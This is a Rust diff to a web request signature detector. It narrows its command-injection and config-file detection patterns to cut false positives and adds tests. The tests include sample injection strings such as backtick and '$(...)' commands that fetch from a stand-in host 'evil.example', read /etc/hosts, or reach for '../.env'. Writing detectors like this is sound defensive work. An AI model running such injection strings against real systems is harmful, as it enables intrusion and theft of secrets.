@@ -8,24 +8,52 @@ use regex::Regex;
 use serde::{Deserialize, Serialize};
 use tracing::{debug, warn};
 
+/// シェルのコマンドの引数らしいものの始まり（#759）。`-`・`/`・`~`・`.`・
+/// `$`・引用符・`http(s)://`・`C:\`
+const SHELL_ARGUMENT: &str = r#"(?:[-/~.$'"]|https?://|[a-z]:\\)"#;
+
 /// シェルのコマンド名の後に続くもの（#759）。終わり・区切り（`;`・`&`・
 /// `<`・`>`・バッククォート）・閉じ括弧・引用符か、空白と引数らしいもの
-/// （`-`・`/`・`~`・`.`・`$`・引用符・`http(s)://`・`C:\`で始まるもの）。
-/// 英語の文の`; cat lovers`、Markdownの表の`| id |`のように、普通の語や
-/// `|`が続くものは一致しない
-const SHELL_COMMAND_TAIL: &str = r#"(?:\s*$|\s*[;&<>`)'"]|\s+(?:[-/~.$'"]|https?://|[a-z]:\\))"#;
+/// （[`SHELL_ARGUMENT`]）。英語の文の`; cat lovers`、Markdownの表の
+/// `| id |`のように、普通の語や`|`が続くものは一致しない
+fn shell_command_tail() -> String {
+    format!(r#"(?:\s*$|\s*[;&<>`)'"]|\s+{SHELL_ARGUMENT})"#)
+}
 
-/// CMD-001で見るシェルのコマンド名（#759）
+/// CMD-001等で見るシェルのコマンド名（#759）
 const SHELL_COMMANDS: &str = "rm|curl|wget|nc|ncat|netcat|telnet|bash|sh|zsh|ksh|dash|cat|\
      chmod|chown|python[23]?|perl|ruby|php|powershell|pwsh|cmd|id|whoami|uname|ls|ping|nslookup";
 
-/// CMD-001の正規表現（#759）。区切り（`;`・`&`・`|`・改行・バッククォート）
-/// の後のシェルのコマンド（`/bin/`等のパスを付けたものも）に、
-/// [`SHELL_COMMAND_TAIL`]が続くものと、Shellshock（`() { :; };`）
+/// シェルのコマンドの前に付くパス（`/bin/`・`/usr/sbin/`等）
+const SHELL_COMMAND_DIR: &str = r"/(?:usr/)?s?bin/";
+
+/// CMD-001の正規表現（#759）。区切り（`;`・`&`・`|`・改行）の後の
+/// シェルのコマンド（`/bin/`等のパスを付けたものも）に、
+/// [`shell_command_tail`]が続くものと、Shellshock（`() { :; };`）。
+/// バッククォートはCMD-002で見る（Markdownの`` `id` ``に当てない）
 fn shell_command_injection_pattern() -> String {
     format!(
-        r"(?i)(?:[;&|\n`]\s*(?:/(?:usr/)?s?bin/)?(?:{SHELL_COMMANDS}){SHELL_COMMAND_TAIL}|\(\)\s*\{{\s*:\s*;\s*\}}\s*;)"
+        r"(?i)(?:[;&|\n]\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS}){tail}|\(\)\s*\{{\s*:\s*;\s*\}}\s*;)",
+        tail = shell_command_tail()
     )
+}
+
+/// CMD-002の正規表現（#759）。バッククォートの中が、シェルのコマンドに
+/// 引数らしいもの（[`SHELL_ARGUMENT`]）が続くもの、パスを付けたコマンド
+/// （`` `/bin/id` ``）、`whoami`・`uname`だけのもの、値に続けたコマンド
+/// だけのもの（`` name=`id` ``）。以前は`` `[\w\s]+` ``で、Markdownの
+/// コード（`` `id` ``・`` `foo bar` ``）にも当たった
+fn backtick_command_pattern() -> String {
+    format!(
+        r"(?i)(?:`\s*(?:(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})\s+{SHELL_ARGUMENT}[^`]*|{SHELL_COMMAND_DIR}(?:{SHELL_COMMANDS})|whoami|uname)\s*`|[\w=]`\s*(?:{SHELL_COMMANDS})\s*`)"
+    )
+}
+
+/// CMD-003の正規表現（#759）。`$(`の中がシェルのコマンド（パスを付けた
+/// ものも）で、その後が空白か`)`のもの。以前は`\$\([^)]+\)`で、jQueryの
+/// `$(document)`・`$('.x')`にも当たった
+fn dollar_paren_command_pattern() -> String {
+    format!(r"(?i)\$\(\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})(?:\s|\))")
 }
 
 /// シグネチャ検知器
@@ -452,11 +480,14 @@ impl SignatureDetector {
                 "Windows UNC path access",
                 vec![],
             )?,
+            // パスの中のファイル名だけ（#759。以前は`.initial`・`.conference`
+            // 等の語にも当たった）。始まり・`/`・`\`・`=`の後の名前が
+            // `.env`等で終わり、その後が終わり・区切り・`.`のもの
             AttackPattern::new(
                 "PATH-008",
                 "Config File Access",
                 DetectionType::UnauthorizedAccess,
-                r"\.(env|config|ini|conf)",
+                r#"(?i)(?:^|[/\\=])[\w.-]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;.'"\s])"#,
                 Severity::High,
                 "Configuration file access",
                 vec![],
@@ -497,11 +528,12 @@ impl SignatureDetector {
                 "Shell command injection",
                 vec![],
             )?,
+            // CMD-002・003も、中がシェルのコマンドのときだけ（#759）
             AttackPattern::new(
                 "CMD-002",
                 "Backtick Command",
                 DetectionType::Other,
-                r"`[\w\s]+`",
+                &backtick_command_pattern(),
                 Severity::Critical,
                 "Backtick command execution",
                 vec![],
@@ -510,7 +542,7 @@ impl SignatureDetector {
                 "CMD-003",
                 "Dollar Parenthesis",
                 DetectionType::Other,
-                r"\$\([^)]+\)",
+                &dollar_paren_command_pattern(),
                 Severity::Critical,
                 "Dollar parenthesis command",
                 vec![],
@@ -522,7 +554,7 @@ impl SignatureDetector {
                 "CMD-004",
                 "Pipe Command",
                 DetectionType::Other,
-                &format!(r"(?i)\|\s*(?:cat|ls|pwd|whoami|id){SHELL_COMMAND_TAIL}"),
+                &format!(r"(?i)\|\s*(?:cat|ls|pwd|whoami|id){}", shell_command_tail()),
                 Severity::High,
                 "Piped command execution",
                 vec![],
@@ -531,7 +563,7 @@ impl SignatureDetector {
                 "CMD-005",
                 "Semicolon Command",
                 DetectionType::Other,
-                &format!(r"(?i);\s*(?:rm|del|format|kill){SHELL_COMMAND_TAIL}"),
+                &format!(r"(?i);\s*(?:rm|del|format|kill){}", shell_command_tail()),
                 Severity::Critical,
                 "Semicolon command chaining",
                 vec![],
@@ -969,6 +1001,77 @@ mod tests {
                 result.pattern_names
             );
             assert_eq!(result.detection_type, DetectionType::XssAttack);
+        }
+    }
+
+    /// Markdownのコード・jQuery・`.ini`で始まる語・設定ファイルの名前を
+    /// 含む文は、CMD-002・003・PATH-008に当たらない（#759。以前は
+    /// Critical・Highで、HTTP 403になった）
+    #[tokio::test]
+    async fn test_markdown_code_jquery_and_config_words_are_not_attacks() {
+        let detector = SignatureDetector::new().await.unwrap();
+        let bodies = [
+            r#"{"content":"Use the `id` field and `foo bar`; run `ls` or `cat` to see it"}"#,
+            r#"{"content":"<p>`whoami is a command` and `the ls tool`</p>"}"#,
+            r#"{"code":"$(document).ready(function(){ $('.x').hide(); $(this).show(); $(window) })"}"#,
+            r#"{"content":"See /docs/a.initial and the initial value; web.config or settings.ini in prose","url":"https://example.com/conference.conference"}"#,
+        ];
+        for body in bodies {
+            let result = detector
+                .detect(&request_with(&[], &[], Some(body)))
+                .await
+                .unwrap();
+            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
+        }
+        let result = detector
+            .detect(&request_with(&[("q", "initial.value")], &[], None))
+            .await
+            .unwrap();
+        assert!(!result.matched, "{:?}", result.pattern_names);
+    }
+
+    /// バッククォート・`$(`の中のコマンドと、パスの中の設定ファイルは、
+    /// 引き続き検知する（#759）
+    #[tokio::test]
+    async fn test_backtick_dollar_paren_and_config_files_are_still_detected() {
+        let detector = SignatureDetector::new().await.unwrap();
+        let cases = [
+            ("q", "`cat /etc/hosts`", "Backtick Command"),
+            ("q", "`curl http://evil.example/x`", "Backtick Command"),
+            ("q", "`/bin/id`", "Backtick Command"),
+            ("q", "` whoami `", "Backtick Command"),
+            ("name", "x`id`", "Backtick Command"),
+            ("q", "$(id)", "Dollar Parenthesis"),
+            ("q", "$(cat /etc/hosts)", "Dollar Parenthesis"),
+            ("q", "$( /bin/sh -c 'uname')", "Dollar Parenthesis"),
+            ("q", "$(curl http://evil.example/x)", "Dollar Parenthesis"),
+            ("file", "../.env", "Config File Access"),
+            ("file", "/app/config.ini", "Config File Access"),
+            ("file", ".env.local", "Config File Access"),
+        ];
+        for (key, value, name) in cases {
+            let result = detector
+                .detect(&request_with(&[(key, value)], &[], None))
+                .await
+                .unwrap();
+            assert!(
+                result.pattern_names.contains(&name.to_string()),
+                "{value}: {:?}",
+                result.pattern_names
+            );
+            assert!(result.severity >= Severity::High, "{value}");
+        }
+        for path in ["/.env", "/web.config", "/etc/nginx/nginx.conf"] {
+            let mut request = request_with(&[], &[], None);
+            request.path = path.to_string();
+            let result = detector.detect(&request).await.unwrap();
+            assert!(
+                result
+                    .pattern_names
+                    .contains(&"Config File Access".to_string()),
+                "{path}: {:?}",
+                result.pattern_names
+            );
         }
     }
 }
